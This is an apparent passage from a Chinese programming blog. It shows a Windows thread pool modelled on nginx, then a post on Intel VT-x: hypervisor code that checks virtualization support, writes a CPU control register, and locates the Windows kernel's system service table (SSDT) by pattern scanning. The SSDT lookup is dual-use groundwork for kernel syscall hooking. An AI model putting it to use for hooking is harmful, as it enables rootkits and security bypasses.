class="comment">//线程池管理员</span></span><br><span class="line"><span class="type">ngx_thread_task_t</span>* task;</span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AcquireSRWLockExclusive</span>(&amp;(tp-&gt;lock));  <span class="comment">//获得SRW锁 独占权</span></span><br><span class="line">        tp-&gt;waiting--;   <span class="comment">//注意看看有没有初始化</span></span><br><span class="line">        <span class="keyword">while</span> (tp-&gt;queue.first == <span class="literal">NULL</span>) <span class="comment">//看看有无任务</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">SleepConditionVariableSRW</span>(&amp;tp-&gt;cond, &amp;tp-&gt;lock, INFINITE, <span class="literal">NULL</span>) == <span class="literal">false</span>)   <span class="comment">//释放锁  Sleep 等待通知唤醒重新拿到锁的控制权</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//调用上述函数失败</span></span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//如果任务存在</span></span><br><span class="line">        task = tp-&gt;queue.first;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tp-&gt;queue.first = task-&gt;next;   <span class="comment">//队列任务下移  </span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span> (tp-&gt;queue.first == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//只有上述一个任务的时候 将Last域置空</span></span><br><span class="line">            tp-&gt;queue.last = &amp;tp-&gt;queue.first;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="comment">//处理队列中的认为</span></span><br><span class="line">        task-&gt;<span class="built_in">handler</span>(task-&gt;ctx);   <span class="comment">//将任务插入到队列的时候都会放置处理函数</span></span><br><span class="line">        task-&gt;next = <span class="literal">NULL</span>;          <span class="comment">//当前任务从 任务队列中断开</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假如task是使用了动态申请 一定要主要回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_task_post</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp, <span class="type">ngx_thread_task_t</span>* task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">AcquireSRWLockExclusive</span>(&amp;tp-&gt;lock);  <span class="comment">//获得SRW锁  </span></span><br><span class="line"><span class="keyword">if</span> (tp-&gt;waiting &gt;= tp-&gt;max_queue) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">task-&gt;id = ngx_thread_pool_task_id++;   <span class="comment">//使用全局变量为每个任务节点进行编号</span></span><br><span class="line">task-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">WakeConditionVariable</span>(&amp;tp-&gt;cond);       <span class="comment">//通知工作线程</span></span><br><span class="line">*tp-&gt;queue.last = task;</span><br><span class="line">tp-&gt;queue.last = &amp;task-&gt;next;</span><br><span class="line">tp-&gt;waiting++;</span><br><span class="line"><span class="built_in">ReleaseSRWLockExclusive</span>(&amp;tp-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">ngx_thread_pool_destroy</span>(tp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_destroy</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>           n;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>     task;    <span class="comment">//投递退出循环的任务</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">int</span> lock;    <span class="comment">//不允许从寄存器中获取该数据  </span></span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;task, <span class="built_in">sizeof</span>(<span class="type">ngx_thread_task_t</span>));</span><br><span class="line">task.handler = ngx_thread_pool_exit_handler;     <span class="comment">//杀死当前线程</span></span><br><span class="line">task.ctx = (<span class="type">void</span>*)&amp;lock;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; tp-&gt;threads; n++)</span><br><span class="line">&#123;</span><br><span class="line">lock = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task) != <span class="literal">true</span>)   <span class="comment">//开一枪 死一个</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (lock)    </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_handler</span><span class="params">(<span class="type">void</span>* data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ThreadIdentify:%d ngx_thread_pool_exit_handler()\r\n&quot;</span>), <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* lock = (<span class="type">unsigned</span> <span class="type">int</span>*)data;</span><br><span class="line">*lock = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ExitThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;浅谈nginx线程池.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//条件变量 读写锁</span></span><br><span class="line"><span class="comment">//数据结构</span></span><br><span class="line"><span class="comment">//销毁线程池</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ngx_thread_handler</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;   <span class="comment">//只能在当前CPP文件中被调用</span></span><br><span class="line"><span class="type">void</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">ngx_thread_task_t</span>    task[<span class="number">2</span>];      <span class="comment">//处理任务</span></span><br><span class="line"><span class="built_in">ZeroMemory</span>(task, <span class="built_in">sizeof</span>(<span class="type">ngx_thread_task_t</span>) * <span class="number">2</span>);   <span class="comment">//内存进行初始</span></span><br><span class="line"><span class="type">int</span> ctx1 = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> ctx2 = <span class="number">2</span>;</span><br><span class="line">task[<span class="number">0</span>].handler = ngx_thread_handler;  <span class="comment">//处理数据的函数</span></span><br><span class="line">task[<span class="number">0</span>].ctx = (<span class="type">void</span>*)&amp;ctx1;</span><br><span class="line"></span><br><span class="line">task[<span class="number">1</span>].handler = ngx_thread_handler;</span><br><span class="line">task[<span class="number">1</span>].ctx = (<span class="type">void</span>*)&amp;ctx2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池初始化 必须指定线程池中的线程个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前系统信息</span></span><br><span class="line">SYSTEM_INFO SystemInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;SystemInfo);</span><br><span class="line">DWORD dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池进行信息配置</span></span><br><span class="line"><span class="type">ngx_thread_pool_t</span>* tp = <span class="built_in">ngx_thread_pool_config</span>(<span class="number">3</span>);   <span class="comment">//线程池的管理员</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池进行初始化</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> != <span class="built_in">ngx_thread_pool_init_worker</span>(tp)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//投递任务</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task[<span class="number">0</span>]) != <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_task_post</span>(tp, &amp;task[<span class="number">1</span>]) != <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"><span class="built_in">ngx_thread_pool_exit_worker</span>(tp);   <span class="comment">//通知工作线程解散   </span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">ngx_thread_handler</span><span class="params">(<span class="type">void</span>* ctx)</span>  <span class="comment">//任务节点的数据处理函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v1 = *(<span class="type">int</span>*)ctx;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ThreadIdentify:%d ngx_thread_handler() %d\r\n&quot;</span>),<span class="built_in">GetCurrentThreadId</span>(),v1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VT-x</title>
      <link href="/2024/02/04/VT-x/"/>
      <url>/2024/02/04/VT-x/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h1><center>目录（点击跳转）<center><p>[TOC]</p><div style="page-break-after:always;"></div><h1 id="检查硬件虚拟化"><a href="#检查硬件虚拟化" class="headerlink" title="检查硬件虚拟化"></a>检查硬件虚拟化</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">HvmIsHVSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPU_VENDOR vendor = <span class="built_in">UtilCPUVendor</span>();<span class="comment">// CPU供应商</span></span><br><span class="line">    <span class="keyword">if</span> (vendor == CPU_Intel)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">VmxHardSupported</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UtilCPUVendor获取CPU制造商信息"><a href="#UtilCPUVendor获取CPU制造商信息" class="headerlink" title="UtilCPUVendor获取CPU制造商信息"></a>UtilCPUVendor获取CPU制造商信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get CPU vendor</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Intel or AMD. If failed - Other&lt;/returns&gt;</span></span><br><span class="line"><span class="function">CPU_VENDOR <span class="title">UtilCPUVendor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUID data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> vendor[<span class="number">0x20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    __cpuid( (<span class="type">int</span>*)&amp;data, <span class="number">0</span> );<span class="comment">// #include &lt;intrin.h&gt;</span></span><br><span class="line">    *(<span class="type">int</span>*)(vendor) = data.ebx;</span><br><span class="line">    *(<span class="type">int</span>*)(vendor + <span class="number">4</span>) = data.edx;</span><br><span class="line">    *(<span class="type">int</span>*)(vendor + <span class="number">8</span>) = data.ecx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>( vendor, <span class="string">&quot;GenuineIntel&quot;</span>, <span class="number">12</span> ) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> CPU_Intel;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>( vendor, <span class="string">&quot;AuthenticAMD&quot;</span>, <span class="number">12</span> ) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> CPU_AMD;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CPU_Other;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VmxHardSupported检查硬件虚拟化是否支持"><a href="#VmxHardSupported检查硬件虚拟化是否支持" class="headerlink" title="VmxHardSupported检查硬件虚拟化是否支持"></a>VmxHardSupported检查硬件虚拟化是否支持</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Check if VT-x is supported</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;TRUE if supported&lt;/returns&gt;</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">VmxHardSupported</span><span class="params">()</span><span class="comment">// 检查VT-x是否支持</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUID data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMX bit</span></span><br><span class="line">    __cpuid( (<span class="type">int</span>*)&amp;data, <span class="number">1</span> );</span><br><span class="line">    <span class="keyword">if</span> ((data.ecx &amp; (<span class="number">1</span> &lt;&lt; <span class="number">5</span>)) == <span class="number">0</span>)<span class="comment">// 检查ecx寄存器的第5位是否为1</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;<span class="comment">// 如果是0，说明不支持VT-x</span></span><br><span class="line"></span><br><span class="line">    IA32_FEATURE_CONTROL_MSR Control = &#123; <span class="number">0</span> &#125;;<span class="comment">// 读取IA32_FEATURE_CONTROL_MSR寄存器</span></span><br><span class="line">    Control.All = __readmsr( MSR_IA32_FEATURE_CONTROL );<span class="comment">// IA32_FEATURE_CONTROL_MSR寄存器的地址为0x3A</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// BIOS lock check</span></span><br><span class="line">    <span class="keyword">if</span> (Control.Fields.Lock == <span class="number">0</span>)<span class="comment">// 检查是否锁定</span></span><br><span class="line">    &#123;</span><br><span class="line">        Control.Fields.Lock = TRUE;<span class="comment">// 将锁定位置1</span></span><br><span class="line">        Control.Fields.EnableVmxon = TRUE;<span class="comment">// 将VMXON使能位置1</span></span><br><span class="line">        __writemsr( MSR_IA32_FEATURE_CONTROL, Control.All );<span class="comment">// 写入IA32_FEATURE_CONTROL_MSR寄存器</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Control.Fields.EnableVmxon == FALSE)<span class="comment">// 检查VMXON是否使能</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: VMX locked off in BIOS\n&quot;</span>, CPU_IDX, __FUNCTION__ );<span class="comment">// 如果没有使能，打印错误信息</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UtilSSDTEntry获取系统服务描述表特定索引处函数地址"><a href="#UtilSSDTEntry获取系统服务描述表特定索引处函数地址" class="headerlink" title="UtilSSDTEntry获取系统服务描述表特定索引处函数地址"></a>UtilSSDTEntry获取系统服务描述表特定索引处函数地址</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets the SSDT entry address by index.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilSSDTEntry</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG size = <span class="number">0</span>;</span><br><span class="line">    PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = <span class="built_in">UtilSSDTBase</span>();<span class="comment">// 获取SSDT表的基址</span></span><br><span class="line">    PVOID pBase = <span class="built_in">UtilKernelBase</span>( &amp;size );<span class="comment">// 获取内核基址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pSSDT &amp;&amp; pBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对索引进行范围检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; pSSDT-&gt;NumberOfServices)<span class="comment">// 如果索引大于服务数量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; <span class="number">4</span>);<span class="comment">// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取SSDT表函数地址"><a href="#获取SSDT表函数地址" class="headerlink" title="获取SSDT表函数地址"></a>获取SSDT表函数地址</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets the SSDT entry address by index.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilSSDTEntry</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG size = <span class="number">0</span>;</span><br><span class="line">    PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = <span class="built_in">UtilSSDTBase</span>();<span class="comment">// 获取SSDT表的基址</span></span><br><span class="line">    PVOID pBase = <span class="built_in">UtilKernelBase</span>( &amp;size );<span class="comment">// 获取内核基址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pSSDT &amp;&amp; pBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对索引进行范围检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; pSSDT-&gt;NumberOfServices)<span class="comment">// 如果索引大于服务数量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; <span class="number">4</span>);<span class="comment">// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取SSDT表基地址"><a href="#获取SSDT表基地址" class="headerlink" title="获取SSDT表基地址"></a>获取SSDT表基地址</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets SSDT base - KiServiceTable</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;SSDT base, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PSYSTEM_SERVICE_DESCRIPTOR_TABLE <span class="title">UtilSSDTBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    NTOS内核是Windows操作系统的核心部分，</span></span><br><span class="line"><span class="comment">    负责管理操作系统的基本功能，</span></span><br><span class="line"><span class="comment">    如进程管理、内存管理、设备管理、文件系统等。</span></span><br><span class="line"><span class="comment">    在NT内核中，大部分的系统服务都是通过系统调用来实现的，</span></span><br><span class="line"><span class="comment">    而系统服务描述符表(SSDT)则是记录这些系统服务函数的重要数据结构之一。</span></span><br><span class="line"><span class="comment">    如果要在Windows操作系统内核中进行一些工作</span></span><br><span class="line"><span class="comment">    ，必须首先得到NTOS内核的基地址。</span></span><br><span class="line"><span class="comment">    因为所有的系统组件和模块都是基于内核加载的，</span></span><br><span class="line"><span class="comment">    只有获得NTOS内核的基地址，才能找到内核中具体的系统函数、数据结构，以便进行修改和操作。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    PUCHAR ntosBase = <span class="built_in">UtilKernelBase</span>( <span class="literal">NULL</span> );<span class="comment">// 获取NTOS内核的基址</span></span><br><span class="line">    <span class="comment">// Already found</span></span><br><span class="line">    <span class="keyword">if</span> (g_SSDT != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> g_SSDT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ntosBase)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS pHdr = <span class="built_in">RtlImageNtHeader</span>( ntosBase );<span class="comment">// 获取NTOS内核的PE头</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pFirstSec = (PIMAGE_SECTION_HEADER)(pHdr + <span class="number">1</span>);<span class="comment">// 获取NTOS内核的第一个节表</span></span><br><span class="line">    <span class="keyword">for</span> (PIMAGE_SECTION_HEADER pSec = pFirstSec; pSec &lt; pFirstSec + pHdr-&gt;FileHeader.NumberOfSections; pSec++)</span><br><span class="line">    &#123;   <span class="comment">// 遍历NTOS内核的所有节表</span></span><br><span class="line">        <span class="comment">// Non-paged, non-discardable, readable sections</span></span><br><span class="line">        <span class="comment">// Probably still not fool-proof enough...</span></span><br><span class="line">        <span class="keyword">if</span> (pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_NOT_PAGED &amp;&amp;</span><br><span class="line">            pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp;</span><br><span class="line">            !(pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_DISCARDABLE) &amp;&amp;</span><br><span class="line">            (*(PULONG)pSec-&gt;Name != <span class="string">&#x27;TINI&#x27;</span>) &amp;&amp;</span><br><span class="line">            (*(PULONG)pSec-&gt;Name != <span class="string">&#x27;EGAP&#x27;</span>))</span><br><span class="line">        &#123;<span class="comment">// 判断是否为非分页、可执行和非可丢弃的、名称不为INIT和PAGE的代码节表</span></span><br><span class="line">            PVOID pFound = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// KiSystemServiceRepeat pattern 模式序列</span></span><br><span class="line">            UCHAR pattern[] = <span 